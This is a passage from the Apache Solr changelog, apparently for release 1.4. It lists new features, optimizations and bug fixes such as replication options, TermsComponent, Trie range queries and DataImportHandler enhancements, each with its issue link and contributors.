  15. [SOLR-829](http://issues.apache.org/jira/browse/SOLR-829): Allow slaves to request compressed files from master during replication

      (Simon Collins, Noble Paul, Akshay Ukey via shalin)
  16. [SOLR-877](http://issues.apache.org/jira/browse/SOLR-877): Added TermsComponent for accessing Lucene's TermEnum capabilities.
      Useful for auto suggest and possibly distributed search. Not distributed search compliant.

      (gsingers)
      - Added mincount and maxcount options

        (Khee Chin via gsingers)
  17. [SOLR-538](http://issues.apache.org/jira/browse/SOLR-538): Add maxChars attribute for copyField function so that the length limit for destination
      can be specified.

      (Georgios Stamatis, Lars Kotthoff, Chris Harris via koji)
  18. [SOLR-284](http://issues.apache.org/jira/browse/SOLR-284): Added support for extracting content from binary documents like MS Word and PDF using Apache Tika. See also contrib/extraction/CHANGES.txt

      (Eric Pugh, Chris Harris, yonik, gsingers)
  19. [SOLR-819](http://issues.apache.org/jira/browse/SOLR-819): Added factories for Arabic support

      (gsingers)
  20. [SOLR-781](http://issues.apache.org/jira/browse/SOLR-781): Distributed search ability to sort field.facet values
      lexicographically. facet.sort values "true" and "false" are
      also deprecated and replaced with "count" and "lex".

      (Lars Kotthoff via yonik)
  21. [SOLR-821](http://issues.apache.org/jira/browse/SOLR-821): Add support for replication to copy conf file to slave with a different name. This allows replication
      of solrconfig.xml

      (Noble Paul, Akshay Ukey via shalin)
  22. [SOLR-911](http://issues.apache.org/jira/browse/SOLR-911): Add support for multi-select faceting by allowing filters to be
      tagged and facet commands to exclude certain filters. This patch also
      added the ability to change the output key for facets in the response, and
      optimized distributed faceting refinement by lowering parsing overhead and
      by making requests and responses smaller.
  23. [SOLR-876](http://issues.apache.org/jira/browse/SOLR-876): WordDelimiterFilter now supports a splitOnNumerics
      option, as well as a list of protected terms.

      (Dan Rosher via hossman)
  24. [SOLR-928](http://issues.apache.org/jira/browse/SOLR-928): SolrDocument and SolrInputDocument now implement the Map<String,?>
      interface. This should make plugging into other standard tools easier.

      (ryan)
  25. [SOLR-847](http://issues.apache.org/jira/browse/SOLR-847): Enhance the snappull command in ReplicationHandler to accept masterUrl.

      (Noble Paul, Preetam Rao via shalin)
  26. [SOLR-540](http://issues.apache.org/jira/browse/SOLR-540): Add support for globbing in field names to highlight.
      For example, hl.fl=\*\_text will highlight all fieldnames ending with
      \_text.

      (Lars Kotthoff via yonik)
  27. [SOLR-906](http://issues.apache.org/jira/browse/SOLR-906): Adding a StreamingUpdateSolrServer that writes update commands to
      an open HTTP connection. If you are using solrj for bulk update requests
      you should consider switching to this implementaion. However, note that
      the error handling is not immediate as it is with the standard SolrServer.

      (ryan)
  28. [SOLR-865](http://issues.apache.org/jira/browse/SOLR-865): Adding support for document updates in binary format and corresponding support in Solrj client.

      (Noble Paul via shalin)
  29. [SOLR-763](http://issues.apache.org/jira/browse/SOLR-763): Add support for Lucene's PositionFilter

      (Mck SembWever via shalin)
  30. [SOLR-966](http://issues.apache.org/jira/browse/SOLR-966): Enhance the map() function query to take in an optional default value

      (Noble Paul, shalin)
  31. [SOLR-820](http://issues.apache.org/jira/browse/SOLR-820): Support replication on startup of master with new index.

      (Noble Paul, Akshay Ukey via shalin)
  32. [SOLR-943](http://issues.apache.org/jira/browse/SOLR-943): Make it possible to specify dataDir in solr.xml and accept the dataDir as a request parameter for
      the CoreAdmin create command.

      (Noble Paul via shalin)
  33. [SOLR-850](http://issues.apache.org/jira/browse/SOLR-850): Addition of timeouts for distributed searching. Configurable through 'shard-socket-timeout' and
      'shard-connection-timeout' parameters in SearchHandler.

      (Patrick O'Leary via shalin)
  34. [SOLR-799](http://issues.apache.org/jira/browse/SOLR-799): Add support for hash based exact/near duplicate document
      handling.

      (Mark Miller, yonik)
  35. [SOLR-1026](http://issues.apache.org/jira/browse/SOLR-1026): Add protected words support to SnowballPorterFilterFactory

      (ehatcher)
  36. [SOLR-739](http://issues.apache.org/jira/browse/SOLR-739): Add support for OmitTf

      (Mark Miller via yonik)
  37. [SOLR-1046](http://issues.apache.org/jira/browse/SOLR-1046): Nested query support for the function query parser
      and lucene query parser (the latter existed as an undocumented
      feature in 1.3)

      (yonik)
  38. [SOLR-940](http://issues.apache.org/jira/browse/SOLR-940): Add support for Lucene's Trie Range Queries by providing new FieldTypes in
      schema for int, float, long, double and date. Single-valued Trie based
      fields with a precisionStep will index multiple precisions and enable
      faster range queries.

      (Uwe Schindler, yonik, shalin)
  39. [SOLR-1038](http://issues.apache.org/jira/browse/SOLR-1038): Enhance CommonsHttpSolrServer to add docs in batch using an iterator API

      (Noble Paul via shalin)
  40. [SOLR-844](http://issues.apache.org/jira/browse/SOLR-844): A SolrServer implementation to front-end multiple solr servers and provides load balancing and failover
      support

      (Noble Paul, Mark Miller, hossman via shalin)
  41. [SOLR-939](http://issues.apache.org/jira/browse/SOLR-939): ValueSourceRangeFilter/Query - filter based on values in a FieldCache entry or on any arbitrary function of field values.

      (yonik)
  42. [SOLR-1095](http://issues.apache.org/jira/browse/SOLR-1095): Fixed performance problem in the StopFilterFactory and simplified code. Added tests as well.

      (gsingers)
  43. [SOLR-1096](http://issues.apache.org/jira/browse/SOLR-1096): Introduced httpConnTimeout and httpReadTimeout in replication slave configuration to avoid stalled
      replication.

      (Jeff Newburn, Noble Paul, shalin)
  44. [SOLR-1115](http://issues.apache.org/jira/browse/SOLR-1115): <bool>on</bool> and <bool>yes</bool> work as expected in solrconfig.xml.

      (koji)
  45. [SOLR-1099](http://issues.apache.org/jira/browse/SOLR-1099): A FieldAnalysisRequestHandler which provides the analysis functionality of the web admin page as
      a service. The AnalysisRequestHandler is renamed to DocumentAnalysisRequestHandler which is enhanced with
      query analysis and showMatch support. AnalysisRequestHandler is now deprecated. Support for both
      FieldAnalysisRequestHandler and DocumentAnalysisRequestHandler is also provided in the Solrj client.

      (Uri Boness, shalin)
  46. [SOLR-1106](http://issues.apache.org/jira/browse/SOLR-1106): Made CoreAdminHandler Actions pluggable so that additional actions may be plugged in or the existing
      ones can be overridden if needed.

      (Kay Kay, Noble Paul, shalin)
  47. [SOLR-1124](http://issues.apache.org/jira/browse/SOLR-1124): Add a top() function query that causes it's argument to
      have it's values derived from the top level IndexReader, even when
      invoked from a sub-reader. top() is implicitly used for the
      ord() and rord() functions.

      (yonik)
  48. [SOLR-1110](http://issues.apache.org/jira/browse/SOLR-1110): Support sorting on trie fields with Distributed Search.

      (Mark Miller, Uwe Schindler via shalin)
  49. [SOLR-1121](http://issues.apache.org/jira/browse/SOLR-1121): CoreAdminhandler should not need a core . This makes it possible to start a Solr server w/o a core .

      (noble)
  50. [SOLR-769](http://issues.apache.org/jira/browse/SOLR-769): Added support for clustering in contrib/clustering. See <http://wiki.apache.org/solr/ClusteringComponent> for more info.

      (gsingers, Stanislaw Osinski)
  51. [SOLR-1175](http://issues.apache.org/jira/browse/SOLR-1175): disable/enable replication on master side. added two commands 'enableReplication' and 'disableReplication'

      (noble)
  52. [SOLR-1179](http://issues.apache.org/jira/browse/SOLR-1179): DocSets can now be used as Lucene Filters via
      DocSet.getTopFilter()

      (yonik)
  53. [SOLR-1116](http://issues.apache.org/jira/browse/SOLR-1116): Add a Binary FieldType

      (noble)
  54. [SOLR-1051](http://issues.apache.org/jira/browse/SOLR-1051): Support the merge of multiple indexes as a CoreAdmin and an update command

      (Ning Li via shalin)
  55. [SOLR-1152](http://issues.apache.org/jira/browse/SOLR-1152): Snapshoot on ReplicationHandler should accept location as a request parameter

      (shalin)
  56. [SOLR-1204](http://issues.apache.org/jira/browse/SOLR-1204): Enhance SpellingQueryConverter to handle UTF-8 instead of ASCII only.
      Use the NMTOKEN syntax for matching field names.

      (Michael Ludwig, shalin)
  57. [SOLR-1189](http://issues.apache.org/jira/browse/SOLR-1189): Support providing username and password for basic HTTP authentication in Java replication

      (Matthew Gregg, shalin)
  58. [SOLR-243](http://issues.apache.org/jira/browse/SOLR-243): Add configurable IndexReaderFactory so that alternate IndexReader implementations
      can be specified via solrconfig.xml. Note that using a custom IndexReader may be incompatible
      with ReplicationHandler (see comments in [SOLR-1366](http://issues.apache.org/jira/browse/SOLR-1366)). This should be treated as an experimental feature.

      (Andrzej Bialecki, hossman, Mark Miller, John Wang)
  59. [SOLR-1214](http://issues.apache.org/jira/browse/SOLR-1214): differentiate between solr home and instanceDir .deprecates the method SolrResourceLoader#locateInstanceDir()
      and it is renamed to locateSolrHome

      (noble)
  60. [SOLR-1216](http://issues.apache.org/jira/browse/SOLR-1216) : disambiguate the replication command names. 'snappull' becomes 'fetchindex' 'abortsnappull' becomes 'abortfetch'

      (noble)
  61. [SOLR-1145](http://issues.apache.org/jira/browse/SOLR-1145): Add capability to specify an infoStream log file for the underlying Lucene IndexWriter in solrconfig.xml.
      This is an advanced debug log file that can be used to aid developers in fixing IndexWriter bugs. See the commented
      out example in the example solrconfig.xml under the indexDefaults section.

      (Chris Harris, Mark Miller)
  62. [SOLR-1256](http://issues.apache.org/jira/browse/SOLR-1256): Show the output of CharFilters in analysis.jsp.

      (koji)
  63. [SOLR-1266](http://issues.apache.org/jira/browse/SOLR-1266): Added stemEnglishPossessive option (default=true) to WordDelimiterFilter
      that allows disabling of english possessive stemming (removal of trailing 's from tokens)

      (Robert Muir via yonik)
  64. [SOLR-1237](http://issues.apache.org/jira/browse/SOLR-1237): firstSearcher and newSearcher can now be identified via the CommonParams.EVENT (evt) parameter
      in a request. This allows a RequestHandler or SearchComponent to know when a newSearcher or firstSearcher
      event happened. QuerySenderListender is the only implementation in Solr that implements this, but outside
      implementations may wish to. See the AbstractSolrEventListener for a helper method.

      (gsingers)
  65. [SOLR-1343](http://issues.apache.org/jira/browse/SOLR-1343): Added HTMLStripCharFilter and marked HTMLStripReader, HTMLStripWhitespaceTokenizerFactory and
      HTMLStripStandardTokenizerFactory deprecated. To strip HTML tags, HTMLStripCharFilter can be used
      with an arbitrary Tokenizer.

      (koji)
  66. [SOLR-1275](http://issues.apache.org/jira/browse/SOLR-1275): Add expungeDeletes to DirectUpdateHandler2

      (noble)
  67. [SOLR-1372](http://issues.apache.org/jira/browse/SOLR-1372): Enhance FieldAnalysisRequestHandler to accept field value from content stream

      (ehatcher)
  68. [SOLR-1370](http://issues.apache.org/jira/browse/SOLR-1370): Show the output of CharFilters in FieldAnalysisRequestHandler

      (koji)
  69. [SOLR-1373](http://issues.apache.org/jira/browse/SOLR-1373): Add Filter query to admin/form.jsp

      (Jason Rutherglen via hossman)
  70. [SOLR-1368](http://issues.apache.org/jira/browse/SOLR-1368): Add ms() function query for getting milliseconds from dates and for
      high precision date subtraction, add sub() for subtracting other arguments.

      (yonik)
  71. [SOLR-1156](http://issues.apache.org/jira/browse/SOLR-1156): Sort TermsComponent results by frequency

      (Matt Weber via yonik)
  72. [SOLR-1335](http://issues.apache.org/jira/browse/SOLR-1335) : load core properties from a properties file

      (noble)
  73. [SOLR-1385](http://issues.apache.org/jira/browse/SOLR-1385) : Add an 'enable' attribute to all plugins

      (noble)
  74. [SOLR-1414](http://issues.apache.org/jira/browse/SOLR-1414) : implicit core properties are not set for single core

      (noble)
  75. [SOLR-659](http://issues.apache.org/jira/browse/SOLR-659) : Adds shards.start and shards.rows to distributed search
      to allow more efficient bulk queries (those that retrieve many or all
      documents).

      (Brian Whitman via yonik)
  76. [SOLR-1321](http://issues.apache.org/jira/browse/SOLR-1321): Add better support for efficient wildcard handling

      (Andrzej Bialecki, Robert Muir, gsingers)
  77. [SOLR-1326](http://issues.apache.org/jira/browse/SOLR-1326) : New interface PluginInfoInitialized for all types of plugin

      (noble)
  78. [SOLR-1447](http://issues.apache.org/jira/browse/SOLR-1447) : Simple property injection. <mergePolicy> & <mergeScheduler> syntaxes are now deprecated

      (Jason Rutherglen, noble)
  79. [SOLR-908](http://issues.apache.org/jira/browse/SOLR-908) : CommonGramsFilterFactory/CommonGramsQueryFilterFactory for
      speeding up phrase queries containing common words by indexing
      n-grams and using them at query time.

      (Tom Burton-West, Jason Rutherglen via yonik)
  80. [SOLR-1292](http://issues.apache.org/jira/browse/SOLR-1292): Add FieldCache introspection to stats.jsp and JMX Monitoring via
      a new SolrFieldCacheMBean.

      (hossman)
  81. [SOLR-1167](http://issues.apache.org/jira/browse/SOLR-1167): Solr Config now supports XInclude for XML engines that can support it.

      (Bryan Talbot via gsingers)
  82. [SOLR-1478](http://issues.apache.org/jira/browse/SOLR-1478): Enable sort by Lucene docid.

      (ehatcher)
  83. [SOLR-1449](http://issues.apache.org/jira/browse/SOLR-1449): Add <lib> elements to solrconfig.xml to specifying additional
      classpath directories and regular expressions.

      (hossman via yonik)
  84. [SOLR-1128](http://issues.apache.org/jira/browse/SOLR-1128): Added metadata output to extraction request handler "extract
      only" option.

      (gsingers)
  85. [SOLR-1274](http://issues.apache.org/jira/browse/SOLR-1274): Added text serialization output for extractOnly

      (Peter Wolanin, gsingers)
  86. [SOLR-768](http://issues.apache.org/jira/browse/SOLR-768): DIH: Set last\_index\_time variable in full-import command.

      (Wojtek Piaseczny, Noble Paul via shalin)
  87. [SOLR-811](http://issues.apache.org/jira/browse/SOLR-811): Allow a "deltaImportQuery" attribute in SqlEntityProcessor
      which is used for delta imports instead of DataImportHandler manipulating
      the SQL itself.

      (Noble Paul via shalin)
  88. [SOLR-842](http://issues.apache.org/jira/browse/SOLR-842): Better error handling in DataImportHandler with options to
      abort, skip and continue imports.

      (Noble Paul, shalin)
  89. [SOLR-833](http://issues.apache.org/jira/browse/SOLR-833): DIH: A DataSource to read data from a field as a reader. This
      can be used, for example, to read XMLs residing as CLOBs or BLOBs in
      databases.

      (Noble Paul via shalin)
  90. [SOLR-887](http://issues.apache.org/jira/browse/SOLR-887): A DIH Transformer to strip HTML tags.

      (Ahmed Hammad via shalin)
  91. [SOLR-886](http://issues.apache.org/jira/browse/SOLR-886): DataImportHandler should rollback when an import fails or it is
      aborted

      (shalin)
  92. [SOLR-891](http://issues.apache.org/jira/browse/SOLR-891): A DIH Transformer to read strings from Clob type.

      (Noble Paul via shalin)
  93. [SOLR-812](http://issues.apache.org/jira/browse/SOLR-812): Configurable JDBC settings in JdbcDataSource including optimized
      defaults for read only mode.

      (David Smiley, Glen Newton, shalin)
  94. [SOLR-910](http://issues.apache.org/jira/browse/SOLR-910): Add a few utility commands to the DIH admin page such as full
      import, delta import, status, reload config.

      (Ahmed Hammad via shalin)
  95. [SOLR-938](http://issues.apache.org/jira/browse/SOLR-938): Add event listener API for DIH import start and end.

      (Kay Kay, Noble Paul via shalin)
  96. [SOLR-801](http://issues.apache.org/jira/browse/SOLR-801): DIH: Add support for configurable pre-import and post-import
      delete query per root-entity.

      (Noble Paul via shalin)
  97. [SOLR-988](http://issues.apache.org/jira/browse/SOLR-988): Add a new scope for session data stored in Context to store
      objects across imports.

      (Noble Paul via shalin)
  98. [SOLR-980](http://issues.apache.org/jira/browse/SOLR-980): A PlainTextEntityProcessor which can read from any
      DataSource<Reader> and output a String.

      (Nathan Adams, Noble Paul via shalin)
  99. [SOLR-1003](http://issues.apache.org/jira/browse/SOLR-1003): XPathEntityprocessor must allow slurping all text from a given
      xml node and its children.

      (Noble Paul via shalin)
  100. [SOLR-1001](http://issues.apache.org/jira/browse/SOLR-1001): Allow variables in various attributes of RegexTransformer,
       HTMLStripTransformer and NumberFormatTransformer.

       (Fergus McMenemie, Noble Paul, shalin)
  101. [SOLR-989](http://issues.apache.org/jira/browse/SOLR-989): DIH: Expose running statistics from the Context API.

       (Noble Paul, shalin)
  102. [SOLR-996](http://issues.apache.org/jira/browse/SOLR-996): DIH: Expose Context to Evaluators.

       (Noble Paul, shalin)
  103. [SOLR-783](http://issues.apache.org/jira/browse/SOLR-783): DIH: Enhance delta-imports by maintaining separate
       last\_index\_time for each entity.

       (Jon Baer, Noble Paul via shalin)
  104. [SOLR-1033](http://issues.apache.org/jira/browse/SOLR-1033): Current entity's namespace is made available to all DIH
       Transformers. This allows one to use an output field of TemplateTransformer
       in other transformers, among other things.

       (Fergus McMenemie, Noble Paul via shalin)
  105. [SOLR-1066](http://issues.apache.org/jira/browse/SOLR-1066): New methods in DIH Context to expose Script details.
       ScriptTransformer changed to read scripts through the new API methods.

       (Noble Paul via shalin)
  106. [SOLR-1062](http://issues.apache.org/jira/browse/SOLR-1062): A DIH LogTransformer which can log data in a given template
       format.

       (Jon Baer, Noble Paul via shalin)
  107. [SOLR-1065](http://issues.apache.org/jira/browse/SOLR-1065): A DIH ContentStreamDataSource which can accept HTTP POST data
       in a content stream. This can be used to push data to Solr instead of
       just pulling it from DB/Files/URLs.

       (Noble Paul via shalin)
  108. [SOLR-1061](http://issues.apache.org/jira/browse/SOLR-1061): Improve DIH RegexTransformer to create multiple columns from
       regex groups.

       (Noble Paul via shalin)
  109. [SOLR-1059](http://issues.apache.org/jira/browse/SOLR-1059): Special DIH flags introduced for deleting documents by query or
       id, skipping rows and stopping further transforms. Use $deleteDocById,
       $deleteDocByQuery for deleting by id and query respectively. Use $skipRow
       to skip the current row but continue with the document. Use $stopTransform
       to stop further transformers. New methods are introduced in Context for
       deleting by id and query.

       (Noble Paul, Fergus McMenemie, shalin)
  110. [SOLR-1076](http://issues.apache.org/jira/browse/SOLR-1076): JdbcDataSource should resolve DIH variables in all its
       configuration parameters.

       (shalin)
  111. [SOLR-1055](http://issues.apache.org/jira/browse/SOLR-1055): Make DIH JdbcDataSource easily extensible by making the
       createConnectionFactory method protected and return a
       Callable<Connection> object.

       (Noble Paul, shalin)
  112. [SOLR-1058](http://issues.apache.org/jira/browse/SOLR-1058): DIH: JdbcDataSource can lookup javax.sql.DataSource using JNDI.
       Use a jndiName attribute to specify the location of the data source.

       (Jason Shepherd, Noble Paul via shalin)
  113. [SOLR-1083](http://issues.apache.org/jira/browse/SOLR-1083): A DIH Evaluator for escaping query characters.

       (Noble Paul, shalin)
  114. [SOLR-934](http://issues.apache.org/jira/browse/SOLR-934): A MailEntityProcessor to enable indexing mails from
       POP/IMAP sources into a solr index.

       (Preetam Rao, shalin)
  115. [SOLR-1060](http://issues.apache.org/jira/browse/SOLR-1060): A DIH LineEntityProcessor which can stream lines of text from a
       given file to be indexed directly or for processing with transformers and
       child entities.

       (Fergus McMenemie, Noble Paul, shalin)
  116. [SOLR-1127](http://issues.apache.org/jira/browse/SOLR-1127): Add support for DIH field name to be templatized.

       (Noble Paul, shalin)
  117. [SOLR-1092](http://issues.apache.org/jira/browse/SOLR-1092): Added a new DIH command named 'import' which does not
       automatically clean the index. This is useful and more appropriate when one
       needs to import only some of the entities.

       (Noble Paul via shalin)
  118. [SOLR-1153](http://issues.apache.org/jira/browse/SOLR-1153): DIH 'deltaImportQuery' is honored on child entities as well

       (noble)
  119. [SOLR-1230](http://issues.apache.org/jira/browse/SOLR-1230): Enhanced dataimport.jsp to work with all DataImportHandler
       request handler configurations, rather than just a hardcoded /dataimport
       handler.

       (ehatcher)
  120. [SOLR-1235](http://issues.apache.org/jira/browse/SOLR-1235): disallow period (.) in DIH entity names

       (noble)
  121. [SOLR-1234](http://issues.apache.org/jira/browse/SOLR-1234): Multiple DIH does not work because all of them write to
       dataimport.properties. Use the handler name as the properties file name

       (noble)
  122. [SOLR-1348](http://issues.apache.org/jira/browse/SOLR-1348): Support binary field type in convertType logic in DIH
       JdbcDataSource

       (shalin)
  123. [SOLR-1406](http://issues.apache.org/jira/browse/SOLR-1406): DIH: Make FileDataSource and FileListEntityProcessor to be more
       extensible

       (Luke Forehand, shalin)
  124. [SOLR-1437](http://issues.apache.org/jira/browse/SOLR-1437): DIH: XPathEntityProcessor can deal with xpath syntaxes such as
       //tagname , /root//tagname

       (Fergus McMenemie via noble)
+ Optimizations   (22)
  1. [SOLR-374](http://issues.apache.org/jira/browse/SOLR-374): Use IndexReader.reopen to save resources by re-using parts of the
     index that haven't changed.

     (Mark Miller via yonik)
  2. [SOLR-808](http://issues.apache.org/jira/browse/SOLR-808): Write string keys in Maps as extern strings in the javabin format.

     (Noble Paul via shalin)
  3. [SOLR-475](http://issues.apache.org/jira/browse/SOLR-475): New faceting method with better performance and smaller memory usage for
     multi-valued fields with many unique values but relatively few values per document.
     Controllable via the facet.method parameter - "fc" is the new default method and "enum"
     is the original method.

     (yonik)
  4. [SOLR-970](http://issues.apache.org/jira/browse/SOLR-970): Use an ArrayList in SolrPluginUtils.parseQueryStrings
     since we know exactly how long the List will be in advance.

     (Kay Kay via hossman)
  5. [SOLR-1002](http://issues.apache.org/jira/browse/SOLR-1002): Change SolrIndexSearcher to use insertWithOverflow
     with reusable priority queue entries to reduce the amount of
     generated garbage during searching.

     (Mark Miller via yonik)
  6. [SOLR-971](http://issues.apache.org/jira/browse/SOLR-971): Replace StringBuffer with StringBuilder for instances that do not require thread-safety.

     (Kay Kay via shalin)
  7. [SOLR-921](http://issues.apache.org/jira/browse/SOLR-921): SolrResourceLoader must cache short class name vs fully qualified classname

     (Noble Paul, hossman via shalin)
  8. [SOLR-973](http://issues.apache.org/jira/browse/SOLR-973): CommonsHttpSolrServer writes the xml directly to the server.

     (Noble Paul via shalin)
  9. [SOLR-1108](http://issues.apache.org/jira/browse/SOLR-1108): Remove un-needed synchronization in SolrCore constructor.

     (Noble Paul via shalin)
  10. [SOLR-1166](http://issues.apache.org/jira/browse/SOLR-1166): Speed up docset/filter generation by avoiding top-level
      score() call and iterating over leaf readers with TermDocs.

      (yonik)
  11. [SOLR-1169](http://issues.apache.org/jira/browse/SOLR-1169): SortedIntDocSet - a new small set implementation
      that saves memory over HashDocSet, is faster to construct,
      is ordered for easier implementation of skipTo, and is faster
      in the general case.

      (yonik)
  12. [SOLR-1165](http://issues.apache.org/jira/browse/SOLR-1165): Use Lucene Filters and pass them down to the Lucene
      search methods to filter earlier and improve performance.

      (yonik)
  13. [SOLR-1111](http://issues.apache.org/jira/browse/SOLR-1111): Use per-segment sorting to share fieldcache elements
      across unchanged segments. This saves memory and reduces
      commit times for incremental updates to the index.

      (yonik)
  14. [SOLR-1188](http://issues.apache.org/jira/browse/SOLR-1188): Minor efficiency improvement in TermVectorComponent related to ignoring positions or offsets

      (gsingers)
  15. [SOLR-1150](http://issues.apache.org/jira/browse/SOLR-1150): Load Documents for Highlighting one at a time rather than
      all at once to avoid OOM with many large Documents.

      (Siddharth Gargate via Mark Miller)
  16. [SOLR-1353](http://issues.apache.org/jira/browse/SOLR-1353): Implement and use reusable token streams for analysis.

      (Robert Muir, yonik)
  17. [SOLR-1296](http://issues.apache.org/jira/browse/SOLR-1296): Enables setting IndexReader's termInfosIndexDivisor via a new attribute to StandardIndexReaderFactory. Enables
      setting termIndexInterval to IndexWriter via SolrIndexConfig.

      (Jason Rutherglen, hossman, gsingers)
  18. [SOLR-846](http://issues.apache.org/jira/browse/SOLR-846): DIH: Reduce memory consumption during delta import by removing
      keys when used

      (Ricky Leung, Noble Paul via shalin)
  19. [SOLR-974](http://issues.apache.org/jira/browse/SOLR-974): DataImportHandler skips commit if no data has been updated.

      (Wojtek Piaseczny, shalin)
  20. [SOLR-1004](http://issues.apache.org/jira/browse/SOLR-1004): DIH: Check for abort more frequently during delta-imports.

      (Marc Sturlese, shalin)
  21. [SOLR-1098](http://issues.apache.org/jira/browse/SOLR-1098): DIH DateFormatTransformer can cache the format objects.

      (Noble Paul via shalin)
  22. [SOLR-1465](http://issues.apache.org/jira/browse/SOLR-1465): Replaced string concatenations with StringBuilder append
      calls in DIH XPathRecordReader.

      (Mark Miller, shalin)
+ Bug Fixes   (105)
  1. [SOLR-774](http://issues.apache.org/jira/browse/SOLR-774): Fixed logging level display

     (Sean Timm via Otis Gospodnetic)
  2. [SOLR-771](http://issues.apache.org/jira/browse/SOLR-771): CoreAdminHandler STATUS should display 'normalized' paths

     (koji, hossman, shalin)
  3. [SOLR-532](http://issues.apache.org/jira/browse/SOLR-532): WordDelimiterFilter now respects payloads and other attributes of the original Token by
     using Token.clone()

     (Tricia Williams, gsingers)
  4. [SOLR-805](http://issues.apache.org/jira/browse/SOLR-805): DisMax queries are not being cached in QueryResultCache

     (Todd Feak via koji)
  5. [SOLR-751](http://issues.apache.org/jira/browse/SOLR-751): WordDelimiterFilter didn't adjust the start offset of single
     tokens that started with delimiters, leading to incorrect highlighting.

     (Stefan Oestreicher via yonik)
  6. [SOLR-843](http://issues.apache.org/jira/browse/SOLR-843): SynonymFilterFactory cannot handle multiple synonym files correctly

     (koji)
  7. [SOLR-840](http://issues.apache.org/jira/browse/SOLR-840): BinaryResponseWriter does not handle incompatible data in fields

     (Noble Paul via shalin)
  8. [SOLR-803](http://issues.apache.org/jira/browse/SOLR-803): CoreAdminRequest.createCore fails because name parameter isn't set

     (Sean Colombo via ryan)
  9. [SOLR-869](http://issues.apache.org/jira/browse/SOLR-869): Fix file descriptor leak in SolrResourceLoader#getLines

     (Mark Miller, shalin)
  10. [SOLR-872](http://issues.apache.org/jira/browse/SOLR-872): Better error message for incorrect copyField destination

      (Noble Paul via shalin)
  11. [SOLR-879](http://issues.apache.org/jira/browse/SOLR-879): Enable position increments in the query parser and fix the
      example schema to enable position increments for the stop filter in
      both the index and query analyzers to fix the bug with phrase queries
      with stopwords.

      (yonik)
  12. [SOLR-836](http://issues.apache.org/jira/browse/SOLR-836): Add missing "a" to the example stopwords.txt

      (yonik)
  13. [SOLR-892](http://issues.apache.org/jira/browse/SOLR-892): Fix serialization of booleans for PHPSerializedResponseWriter

      (yonik)
  14. [SOLR-898](http://issues.apache.org/jira/browse/SOLR-898): Fix null pointer exception for the JSON response writer
      based formats when nl.json=arrarr with null keys.

      (yonik)
  15. [SOLR-901](http://issues.apache.org/jira/browse/SOLR-901): FastOutputStream ignores write(byte[]) call.

      (Noble Paul via shalin)
  16. [SOLR-807](http://issues.apache.org/jira/browse/SOLR-807): BinaryResponseWriter writes fieldType.toExternal if it is not a supported type,
      otherwise it writes fieldType.toObject. This fixes the bug with encoding/decoding UUIDField.

      (koji, Noble Paul, shalin)
  17. [SOLR-863](http://issues.apache.org/jira/browse/SOLR-863): SolrCore.initIndex should close the directory it gets for clearing the lock and
      use the DirectoryFactory.

      (Mark Miller via shalin)
  18. [SOLR-802](http://issues.apache.org/jira/browse/SOLR-802): Fix a potential null pointer error in the distributed FacetComponent

      (David Bowen via ryan)
  19. [SOLR-346](http://issues.apache.org/jira/browse/SOLR-346): Use perl regex to improve accuracy of finding latest snapshot in snapinstaller

      (billa)
  20. [SOLR-830](http://issues.apache.org/jira/browse/SOLR-830): Use perl regex to improve accuracy of finding latest snapshot in snappuller

      (billa)
  21. [SOLR-897](http://issues.apache.org/jira/browse/SOLR-897): Fixed Argument list too long error when there are lots of snapshots/backups

      (Dan Rosher via billa)
  22. [SOLR-925](http://issues.apache.org/jira/browse/SOLR-925): Fixed highlighting on fields with multiValued="true" and termOffsets="true"

      (koji)
  23. [SOLR-902](http://issues.apache.org/jira/browse/SOLR-902): FastInputStream#read(byte b[], int off, int len) gives incorrect results when amount left to read is less
      than buffer size

      (Noble Paul via shalin)
  24. [SOLR-978](http://issues.apache.org/jira/browse/SOLR-978): Old files are not removed from slaves after replication

      (Jaco, Noble Paul, shalin)
  25. [SOLR-883](http://issues.apache.org/jira/browse/SOLR-883): Implicit properties are not set for Cores created through CoreAdmin

      (Noble Paul via shalin)
  26. [SOLR-991](http://issues.apache.org/jira/browse/SOLR-991): Better error message when parsing solrconfig.xml fails due to malformed XML. Error message notes the name
      of the file being parsed.

      (Michael Henson via shalin)
  27. [SOLR-1008](http://issues.apache.org/jira/browse/SOLR-1008): Fix stats.jsp XML encoding for <stat> item entries with ampersands in their names.

      (ehatcher)
  28. [SOLR-976](http://issues.apache.org/jira/browse/SOLR-976): deleteByQuery is ignored when deleteById is placed prior to deleteByQuery in a <delete>.
      Now both delete by id and delete by query can be specified at the same time as follows.
      <delete>
      <id>05991</id><id>06000</id>
      <query>office:Bridgewater</query><query>office:Osaka</query>
      </delete>

      (koji)
  29. [SOLR-1016](http://issues.apache.org/jira/browse/SOLR-1016): HTTP 503 error changes 500 in SolrCore

      (koji)
  30. [SOLR-1015](http://issues.apache.org/jira/browse/SOLR-1015): Incomplete information in replication admin page and http command response when server
      is both master and slave i.e. when server is a repeater

      (Akshay Ukey via shalin)
  31. [SOLR-1018](http://issues.apache.org/jira/browse/SOLR-1018): Slave is unable to replicate when server acts as repeater (as both master and slave)

      (Akshay Ukey, Noble Paul via shalin)
  32. [SOLR-1031](http://issues.apache.org/jira/browse/SOLR-1031): Fix XSS vulnerability in schema.jsp

      (Paul Lovvik via ehatcher)
  33. [SOLR-1064](http://issues.apache.org/jira/browse/SOLR-1064): registry.jsp incorrectly displaying info for last core initialized
      regardless of what the current core is.

      (hossman)
  34. [SOLR-1072](http://issues.apache.org/jira/browse/SOLR-1072): absolute paths used in sharedLib attribute were
      incorrectly treated as relative paths.

      (hossman)
  35. [SOLR-1104](http://issues.apache.org/jira/browse/SOLR-1104): Fix some rounding errors in LukeRequestHandler's histogram

      (hossman)
  36. [SOLR-1125](http://issues.apache.org/jira/browse/SOLR-1125): Use query analyzer rather than index analyzer for queryFieldType in QueryElevationComponent

      (koji)
  37. [SOLR-1126](http://issues.apache.org/jira/browse/SOLR-1126): Replicated files have incorrect timestamp

      (Jian Han Guo, Jeff Newburn, Noble Paul via shalin)
  38. [SOLR-1094](http://issues.apache.org/jira/browse/SOLR-1094): Incorrect value of correctlySpelled attribute in some cases

      (David Smiley, Mark Miller via shalin)
  39. [SOLR-965](http://issues.apache.org/jira/browse/SOLR-965): Better error message when <pingQuery> is not configured.

      (Mark Miller via hossman)
  40. [SOLR-1135](http://issues.apache.org/jira/browse/SOLR-1135): Java replication creates Snapshot in the directory where Solr was launched

      (Jianhan Guo via shalin)
  41. [SOLR-1138](http://issues.apache.org/jira/browse/SOLR-1138): Query Elevation Component now gracefully handles missing queries.

      (gsingers)
